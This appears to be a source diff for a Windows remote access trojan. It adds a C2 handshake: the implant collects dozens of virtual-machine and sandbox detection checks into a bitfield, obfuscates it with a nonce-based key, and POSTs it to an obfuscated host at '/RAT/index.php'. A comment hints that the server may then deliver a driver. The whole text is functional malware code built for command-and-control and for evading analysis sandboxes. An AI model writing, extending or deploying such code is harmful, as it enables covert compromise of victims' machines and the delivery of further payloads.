@@ -99,6 +99,14 @@ namespace Network_config
 
 }
 
+namespace Challenge
+{
+    uint64_t bitfield = 0;
+
+    const uint64_t MAGIC_A = 0x5BD1E995;
+    const uint64_t MAGIC_B = 0x1337C0DE;
+}
+
 //============================================================================
 
 typedef HMODULE(WINAPI* pfnLoadLibraryA)(LPCSTR lpLibFileName);
@@ -385,106 +393,61 @@ bool static reconnect()
     else return true;
 }
 
-int send_data(const std::string& filename, const std::string& data)
+std::vector<unsigned char> send_data(const std::string& filename, const std::string& data)
 {
     if(clientSocket == INVALID_SOCKET)
     {
-#if DEBUG
-        std::cerr << "Socket is invalid. Reconnecting..." << std::endl;
-#endif
-        if(!reconnect())
-        {
-#if DEBUG
-            std::cerr << "Reconnection failed." << std::endl;
-#endif
-
-            return 0;
-        }
+        if (!reconnect()) return {};
     }
-    bool connected = TRUE;
-    std::unique_lock<std::mutex> lock(socketMutex);
+
+    std::vector<unsigned char> serverResponse;
+    bool connected = true;
 
     while(connected)
     {
         try
         {
-            std::string requestString = "POST /RAT/index.php HTTP/1.1\r\n" +
+            std::string requestHeaders =
+                "POST /RAT/index.php HTTP/1.1\r\n" +
                 deobfuscate(Network_config::encrypted_host, Network_config::KeyHost) +
-                "Content-Length: " + std::to_string(filename.length() + data.length()) + "\r\n" +
+                "X-File-Name: " + filename + "\r\n" +
+                "Content-Length: " + std::to_string(data.length()) + "\r\n" +
                 "Content-Type: application/octet-stream\r\n" +
-                "Connection: keep-alive\r\n\r\n" +
-                filename + data;
-            int bytesSent = send(clientSocket, requestString.c_str(), static_cast<int>(requestString.length()), 0);
-            if(bytesSent == SOCKET_ERROR)
-            {
-#if DEBUG
-                int error = WSAGetLastError();
-                std::cerr << "Send failed with error: " << error << std::endl;
-#endif
+                "Connection: close\r\n\r\n";
 
-                connected = false;
+            
+            send(clientSocket, requestHeaders.c_str(), (int)requestHeaders.length(), 0);
+
+            if(!data.empty())
+            {
+                send(clientSocket, data.c_str(), (int)data.length(), 0);
             }
 
             char buffer[4096];
             int bytesReceived;
-            std::string response;
-
             do
             {
-                bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
-                if(bytesReceived > 0)
-                {
-                    buffer[bytesReceived] = '\0';
-                    response += buffer;
-                }
-                else if(bytesReceived == 0)
-                {
-#if DEBUG
-                    std::cout << "Connection closed by server." << std::endl; connected = FALSE;
-#endif
+                bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
+                if(bytesReceived > 0) serverResponse.insert(serverResponse.end(), buffer, buffer + bytesReceived);
 
-                    lock.unlock();
-                    while(!reconnect())
-                    {
-#if DEBUG
-                        std::cerr << "Reconnection failed. Retrying in 2 seconds..." << std::endl;
-#endif
+            } while (bytesReceived > 0);
 
-                        Sleep(2000);
-                    }
-#if DEBUG
-                    std::cerr << "Reconnection successful. Retrying request..." << std::endl;
-#endif
-
-                    connected = TRUE;
-                    lock.lock();
-                    continue;
-                }
-                else
-                {
-#if DEBUG
-                    int error = WSAGetLastError();
-                    std::cerr << "Receive failed with error: " << error << std::endl;
-#endif
-
-                    connected = false;
-                    throw std::runtime_error("Receive failed");
-                }
-            } while(bytesReceived == sizeof(buffer) - 1);
+            closesocket(clientSocket);
+            clientSocket = INVALID_SOCKET;
             break;
         }
-        catch(const std::exception& e)
-        {
-#if DEBUG
-            std::cerr << "Exception in send_data: " << e.what() << std::endl;
-#else
-            (void)e;
-#endif
-
-            return 0;
-        }
+        catch (...) { return {}; }
     }
-    return 1;
+
+
+    // return response
+    const char* headerEnd = "\r\n\r\n";
+    auto it = std::search(serverResponse.begin(), serverResponse.end(), headerEnd, headerEnd + 4);
+
+    if(it != serverResponse.end()) return std::vector<unsigned char>(it + 4, serverResponse.end()); 
+
+    return {};
+
 }
 
 std::vector<unsigned char> receive_data_raw(const std::string& filename)
@@ -681,20 +644,20 @@ void static SetupProxies()
     }
 }
 
-void static ShowDetectionReport(uint64_t mask)
+void static ShowDetectionReport()
 {
     std::stringstream ss;
     ss << "--- VM Detection Report ---\n";
-    ss << "Raw Mask: 0x" << std::hex << mask << std::dec << "\n\n";
+    ss << "Raw bitfield: 0x" << std::hex << Challenge::bitfield << std::dec << "\n\n";
 
-    if(mask == 0)  ss << "  [OK] No virtualization techniques detected.\n";
+    if(Challenge::bitfield == 0)  ss << "  [OK] No virtualization techniques detected.\n";
     else
     {
 
-// Helper macro to append to stringstream
-#define CHECK_APPEND(flag_name) \
-if(mask & VM_Techniques::flag_name) \
-ss << "  [!] Detected: " #flag_name << "\n"
+        // Helper macro to append to stringstream
+        #define CHECK_APPEND(flag_name) \
+            if(Challenge::bitfield & VM_Techniques::flag_name) \
+            ss << "  [!] Detected: " #flag_name << "\n"
 
         // --- Windows Specific ---
         CHECK_APPEND(GPU_CAPABILITIES);
@@ -761,68 +724,80 @@ ss << "  [!] Detected: " #flag_name << "\n"
 
 NTSTATUS static checkVM()
 {
-
-    uint64_t mask = 0;
     // --- Windows Specific ---
-    if(VM::check(VM::GPU_CAPABILITIES))      mask |= VM_Techniques::GPU_CAPABILITIES;
-    if(VM::check(VM::ACPI_SIGNATURE))        mask |= VM_Techniques::ACPI_SIGNATURE;
-    if(VM::check(VM::POWER_CAPABILITIES))    mask |= VM_Techniques::POWER_CAPABILITIES;
-    if(VM::check(VM::DISK_SERIAL))           mask |= VM_Techniques::DISK_SERIAL;
-    if(VM::check(VM::IVSHMEM))               mask |= VM_Techniques::IVSHMEM;
-    if(VM::check(VM::SGDT))                  mask |= VM_Techniques::SGDT;
-    if(VM::check(VM::SLDT))                  mask |= VM_Techniques::SLDT;
-    if(VM::check(VM::SMSW))                  mask |= VM_Techniques::SMSW;
-    if(VM::check(VM::DRIVERS))               mask |= VM_Techniques::DRIVERS;
-    if(VM::check(VM::DEVICE_HANDLES))        mask |= VM_Techniques::DEVICE_HANDLES;
-    if(VM::check(VM::VIRTUAL_PROCESSORS))    mask |= VM_Techniques::VIRTUAL_PROCESSORS;
-    if(VM::check(VM::HYPERVISOR_QUERY))      mask |= VM_Techniques::HYPERVISOR_QUERY;
-    if(VM::check(VM::AUDIO))                 mask |= VM_Techniques::AUDIO;
-    if(VM::check(VM::DISPLAY))               mask |= VM_Techniques::DISPLAY;
-    if(VM::check(VM::DLL))                   mask |= VM_Techniques::DLL;
-    if(VM::check(VM::VMWARE_BACKDOOR))       mask |= VM_Techniques::VMWARE_BACKDOOR;
-    if(VM::check(VM::WINE))                  mask |= VM_Techniques::WINE;
-    if(VM::check(VM::VIRTUAL_REGISTRY))      mask |= VM_Techniques::VIRTUAL_REGISTRY;
-    if(VM::check(VM::MUTEX))                 mask |= VM_Techniques::MUTEX;
-    if(VM::check(VM::DEVICE_STRING))         mask |= VM_Techniques::DEVICE_STRING;
-    if(VM::check(VM::VPC_INVALID))           mask |= VM_Techniques::VPC_INVALID;
-    if(VM::check(VM::VMWARE_STR))            mask |= VM_Techniques::VMWARE_STR;
-    if(VM::check(VM::GAMARUE))               mask |= VM_Techniques::GAMARUE;
-    if(VM::check(VM::CUCKOO_DIR))            mask |= VM_Techniques::CUCKOO_DIR;
-    if(VM::check(VM::CUCKOO_PIPE))           mask |= VM_Techniques::CUCKOO_PIPE;
-    if(VM::check(VM::BOOT_LOGO))             mask |= VM_Techniques::BOOT_LOGO;
-    if(VM::check(VM::TRAP))                  mask |= VM_Techniques::TRAP;
-    if(VM::check(VM::UD))                    mask |= VM_Techniques::UD;
-    if(VM::check(VM::BLOCKSTEP))             mask |= VM_Techniques::BLOCKSTEP;
-    if(VM::check(VM::DBVM))                  mask |= VM_Techniques::DBVM;
-    if(VM::check(VM::OBJECTS))               mask |= VM_Techniques::OBJECTS;
-    if(VM::check(VM::NVRAM))                 mask |= VM_Techniques::NVRAM;
-    if(VM::check(VM::SMBIOS_INTEGRITY))      mask |= VM_Techniques::SMBIOS_INTEGRITY;
-    if(VM::check(VM::EDID))                  mask |= VM_Techniques::EDID;
-    if(VM::check(VM::CPU_HEURISTIC))         mask |= VM_Techniques::CPU_HEURISTIC;
-    if(VM::check(VM::CLOCK))                 mask |= VM_Techniques::CLOCK;
+    if(VM::check(VM::GPU_CAPABILITIES))      Challenge::bitfield |= VM_Techniques::GPU_CAPABILITIES;
+    if(VM::check(VM::ACPI_SIGNATURE))        Challenge::bitfield |= VM_Techniques::ACPI_SIGNATURE;
+    if(VM::check(VM::POWER_CAPABILITIES))    Challenge::bitfield |= VM_Techniques::POWER_CAPABILITIES;
+    if(VM::check(VM::DISK_SERIAL))           Challenge::bitfield |= VM_Techniques::DISK_SERIAL;
+    if(VM::check(VM::IVSHMEM))               Challenge::bitfield |= VM_Techniques::IVSHMEM;
+    if(VM::check(VM::SGDT))                  Challenge::bitfield |= VM_Techniques::SGDT;
+    if(VM::check(VM::SLDT))                  Challenge::bitfield |= VM_Techniques::SLDT;
+    if(VM::check(VM::SMSW))                  Challenge::bitfield |= VM_Techniques::SMSW;
+    if(VM::check(VM::DRIVERS))               Challenge::bitfield |= VM_Techniques::DRIVERS;
+    if(VM::check(VM::DEVICE_HANDLES))        Challenge::bitfield |= VM_Techniques::DEVICE_HANDLES;
+    if(VM::check(VM::VIRTUAL_PROCESSORS))    Challenge::bitfield |= VM_Techniques::VIRTUAL_PROCESSORS;
+    if(VM::check(VM::HYPERVISOR_QUERY))      Challenge::bitfield |= VM_Techniques::HYPERVISOR_QUERY;
+    if(VM::check(VM::AUDIO))                 Challenge::bitfield |= VM_Techniques::AUDIO;
+    if(VM::check(VM::DISPLAY))               Challenge::bitfield |= VM_Techniques::DISPLAY;
+    if(VM::check(VM::DLL))                   Challenge::bitfield |= VM_Techniques::DLL;
+    if(VM::check(VM::VMWARE_BACKDOOR))       Challenge::bitfield |= VM_Techniques::VMWARE_BACKDOOR;
+    if(VM::check(VM::WINE))                  Challenge::bitfield |= VM_Techniques::WINE;
+    if(VM::check(VM::VIRTUAL_REGISTRY))      Challenge::bitfield |= VM_Techniques::VIRTUAL_REGISTRY;
+    if(VM::check(VM::MUTEX))                 Challenge::bitfield |= VM_Techniques::MUTEX;
+    if(VM::check(VM::DEVICE_STRING))         Challenge::bitfield |= VM_Techniques::DEVICE_STRING;
+    if(VM::check(VM::VPC_INVALID))           Challenge::bitfield |= VM_Techniques::VPC_INVALID;
+    if(VM::check(VM::VMWARE_STR))            Challenge::bitfield |= VM_Techniques::VMWARE_STR;
+    if(VM::check(VM::GAMARUE))               Challenge::bitfield |= VM_Techniques::GAMARUE;
+    if(VM::check(VM::CUCKOO_DIR))            Challenge::bitfield |= VM_Techniques::CUCKOO_DIR;
+    if(VM::check(VM::CUCKOO_PIPE))           Challenge::bitfield |= VM_Techniques::CUCKOO_PIPE;
+    if(VM::check(VM::BOOT_LOGO))             Challenge::bitfield |= VM_Techniques::BOOT_LOGO;
+    if(VM::check(VM::TRAP))                  Challenge::bitfield |= VM_Techniques::TRAP;
+    if(VM::check(VM::UD))                    Challenge::bitfield |= VM_Techniques::UD;
+    if(VM::check(VM::BLOCKSTEP))             Challenge::bitfield |= VM_Techniques::BLOCKSTEP;
+    if(VM::check(VM::DBVM))                  Challenge::bitfield |= VM_Techniques::DBVM;
+    if(VM::check(VM::OBJECTS))               Challenge::bitfield |= VM_Techniques::OBJECTS;
+    if(VM::check(VM::NVRAM))                 Challenge::bitfield |= VM_Techniques::NVRAM;
+    if(VM::check(VM::SMBIOS_INTEGRITY))      Challenge::bitfield |= VM_Techniques::SMBIOS_INTEGRITY;
+    if(VM::check(VM::EDID))                  Challenge::bitfield |= VM_Techniques::EDID;
+    if(VM::check(VM::CPU_HEURISTIC))         Challenge::bitfield |= VM_Techniques::CPU_HEURISTIC;
+    if(VM::check(VM::CLOCK))                 Challenge::bitfield |= VM_Techniques::CLOCK;
 
     // --- Linux and Windows ---
-    if(VM::check(VM::SIDT))                  mask |= VM_Techniques::SIDT;
-    if(VM::check(VM::FIRMWARE))              mask |= VM_Techniques::FIRMWARE;
-    if(VM::check(VM::PCI_DEVICES))           mask |= VM_Techniques::PCI_DEVICES;
-    if(VM::check(VM::AZURE))                 mask |= VM_Techniques::AZURE;
-
+    if(VM::check(VM::SIDT))                  Challenge::bitfield |= VM_Techniques::SIDT;
+    if(VM::check(VM::FIRMWARE))              Challenge::bitfield |= VM_Techniques::FIRMWARE;
+    if(VM::check(VM::PCI_DEVICES))           Challenge::bitfield |= VM_Techniques::PCI_DEVICES;
+    if(VM::check(VM::AZURE))                 Challenge::bitfield |= VM_Techniques::AZURE;
+                                             
     // --- Cross-Platform / CPU Related ---
-    if(VM::check(VM::HYPERVISOR_BIT))        mask |= VM_Techniques::HYPERVISOR_BIT;
-    if(VM::check(VM::VMID))                  mask |= VM_Techniques::VMID;
-    if(VM::check(VM::INTEL_THREAD_MISMATCH)) mask |= VM_Techniques::INTEL_THREAD_MISMATCH;
-    if(VM::check(VM::AMD_THREAD_MISMATCH))   mask |= VM_Techniques::AMD_THREAD_MISMATCH;
-    if(VM::check(VM::XEON_THREAD_MISMATCH))  mask |= VM_Techniques::XEON_THREAD_MISMATCH;
-    if(VM::check(VM::TIMER))                 mask |= VM_Techniques::TIMER;
-    if(VM::check(VM::CPU_BRAND))             mask |= VM_Techniques::CPU_BRAND;
-    if(VM::check(VM::HYPERVISOR_STR))        mask |= VM_Techniques::HYPERVISOR_STR;
-    if(VM::check(VM::CPUID_SIGNATURE))       mask |= VM_Techniques::CPUID_SIGNATURE;
-    if(VM::check(VM::BOCHS_CPU))             mask |= VM_Techniques::BOCHS_CPU;
-    if(VM::check(VM::KGT_SIGNATURE))         mask |= VM_Techniques::KGT_SIGNATURE;
+    if(VM::check(VM::HYPERVISOR_BIT))        Challenge::bitfield |= VM_Techniques::HYPERVISOR_BIT;
+    if(VM::check(VM::VMID))                  Challenge::bitfield |= VM_Techniques::VMID;
+    if(VM::check(VM::INTEL_THREAD_MISMATCH)) Challenge::bitfield |= VM_Techniques::INTEL_THREAD_MISMATCH;
+    if(VM::check(VM::AMD_THREAD_MISMATCH))   Challenge::bitfield |= VM_Techniques::AMD_THREAD_MISMATCH;
+    if(VM::check(VM::XEON_THREAD_MISMATCH))  Challenge::bitfield |= VM_Techniques::XEON_THREAD_MISMATCH;
+    if(VM::check(VM::TIMER))                 Challenge::bitfield |= VM_Techniques::TIMER;
+    if(VM::check(VM::CPU_BRAND))             Challenge::bitfield |= VM_Techniques::CPU_BRAND;
+    if(VM::check(VM::HYPERVISOR_STR))        Challenge::bitfield |= VM_Techniques::HYPERVISOR_STR;
+    if(VM::check(VM::CPUID_SIGNATURE))       Challenge::bitfield |= VM_Techniques::CPUID_SIGNATURE;
+    if(VM::check(VM::BOCHS_CPU))             Challenge::bitfield |= VM_Techniques::BOCHS_CPU;
+    if(VM::check(VM::KGT_SIGNATURE))         Challenge::bitfield |= VM_Techniques::KGT_SIGNATURE;
 
-    ShowDetectionReport(mask);
+    //ShowDetectionReport();
     return STATUS_SUCCESS;
 
+}
+
+//============================================================================
+
+uint64_t static SolveChallenge(uint64_t nonce, uint64_t vm_bitfield)
+{
+    // Generate Session Key from Nonce
+    uint64_t session_key = (nonce * Challenge::MAGIC_A) ^ Challenge::MAGIC_B;
+
+    // Encrypt the bitfield
+    uint64_t obfuscated_mask = vm_bitfield ^ session_key;
+
+    // Add Nonce as offset
+    return obfuscated_mask + nonce;
 }
 
 //============================================================================
@@ -855,14 +830,49 @@ unsigned static __stdcall PayloadThread(void* pArguments)
 
     // ----------------------
 
-    send_data("MSIMG32_pxy.txt", " data :)");
-    MessageBoxA(NULL, "Sent data", "notif", MB_OK);
+    std::string id = "112233";
+    std::vector<unsigned char> vNonce = send_data("handshake_" + id + ".dat", "");
 
-    Sleep(1000);
+    vNonce.push_back(0);
+    //MessageBoxA(NULL, reinterpret_cast<const char*>(vNonce.data()), "Got this Nonce", MB_OK);
 
-    std::vector<unsigned char> vReceived = receive_data_raw("MSIMG32_pxy.txt");
-    vReceived.push_back(0);
-    MessageBoxA(NULL, reinterpret_cast<const char*>(vReceived.data()), "Got this", MB_OK);
+    
+
+    std::string sNonce = reinterpret_cast<const char*>(vNonce.data());
+    uint64_t rawNonce = 0;
+
+    size_t pos = sNonce.find("NONCE:");
+    if(pos != std::string::npos)
+    {
+        // Extract the number part ("123456") and convert to uint64_t
+        std::string numPart = sNonce.substr(pos + 6);
+        try {
+            rawNonce = std::stoull(numPart);
+        }
+        catch (...) { rawNonce = 0; }
+    }
+    if(rawNonce == 0) { MessageBoxA(NULL, "Failed to parse Nonce!", "Error", MB_OK); return 1; }
+
+
+
+    uint64_t obfuscated_bitfield = SolveChallenge(rawNonce, Challenge::bitfield);
+
+    //std::stringstream ss;
+    //ss << "Challenge Solved Successfully!\n\n";
+    //ss << "Obfuscated Bitfield: 0x" << std::hex << std::uppercase << obfuscated_bitfield;
+    //MessageBoxA(NULL, ss.str().c_str(), "Challenge Result", MB_OK | MB_ICONINFORMATION);
+
+
+    std::vector<unsigned char> vResponse = send_data("telemetry_" + id + ".dat", std::to_string(obfuscated_bitfield));
+
+    if(vResponse.empty()) MessageBoxA(NULL, "Server sent empty response (404?)", "Error", MB_OK);
+    else
+    {
+        vResponse.push_back(0);
+        MessageBoxA(NULL, reinterpret_cast<const char*>(vResponse.data()), "Server Said", MB_OK);
+
+        // If Mz server sent driver
+    }
 
     // ----------------------
 
